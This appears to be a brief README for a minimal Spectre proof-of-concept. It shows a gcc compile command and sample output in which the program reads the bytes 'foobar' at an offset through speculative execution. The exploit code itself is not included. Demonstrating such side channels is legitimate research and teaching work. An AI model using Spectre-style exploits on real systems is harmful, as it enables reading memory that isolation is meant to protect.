# spectre

Minimal PoC for Spectre

```
$ gcc spectre.c -o spectre
$ ./spectre 16 6
Reading 6 bytes at 16:
offset=16 byte=102 0x66 'f'
offset=17 byte=111 0x6f 'o'
offset=18 byte=111 0x6f 'o'
offset=19 byte=98 0x62 'b'
offset=20 byte=97 0x61 'a'
offset=21 byte=114 0x72 'r'
```
